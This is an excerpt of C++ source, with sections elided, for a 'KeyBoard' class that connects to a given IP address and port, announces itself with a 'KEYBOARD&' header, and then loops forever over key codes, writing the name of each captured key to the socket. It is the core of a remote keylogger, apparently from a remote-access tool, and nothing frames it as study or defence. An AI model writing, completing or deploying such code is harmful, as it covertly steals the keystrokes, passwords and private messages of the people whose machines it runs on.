...
KeyBoard::KeyBoard(char*ip, int port)
{
	...
	Sleep(2000);
	char Head[10] = "KEYBOARD&";
	socket.write(Head);

	char name[1024] = "OPEN_KEYBOARD";
	...
	while (1)
	{
		...
		for (int i = 8; i <= 255; i++)
		{
			...
			{
				KeyName = stringGetKeyName(i);
				socket.write(KeyName.data());
				Sleep(1);
...
string KeyBoard::stringGetKeyName(int NumKey)
{
